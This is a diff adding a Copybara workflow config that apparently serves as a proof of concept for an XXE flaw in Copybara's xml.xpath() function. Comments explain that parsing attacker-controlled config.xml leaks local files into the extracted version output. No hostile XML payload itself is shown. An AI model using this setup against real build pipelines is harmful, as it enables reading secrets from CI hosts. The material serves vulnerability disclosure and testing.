@@ -1,0 +1,34 @@
+# Copybara config — triggers XXE when processing attacker-controlled XML
+# The xml.xpath() Starlark function calls DocumentBuilderFactory.newInstance()
+# with zero XXE protections (XmlModule.java:55)
+
+origin_url = "file:///tmp/source-repo"
+destination_url = "file:///tmp/dest-repo"
+
+def extract_version(ctx):
+    """Reads config.xml from source repo — XXE entity resolves, leaking local files"""
+    xml_content = ctx.read_path(ctx.new_path("config.xml"))
+    version = xml.xpath(
+        content = xml_content,
+        expression = "/project/version",
+        type = "STRING",
+    )
+    ctx.console.info("Extracted version: " + version)
+    ctx.write_path(ctx.new_path("VERSION.txt"), version)
+
+core.workflow(
+    name = "default",
+    origin = git.origin(
+        url = origin_url,
+        ref = "master",
+    ),
+    destination = git.destination(
+        url = destination_url,
+        fetch = "master",
+        push = "master",
+    ),
+    authoring = authoring.pass_thru("CI Bot <ci@company.com>"),
+    transformations = [
+        core.dynamic_transform(extract_version),
+    ],
+)
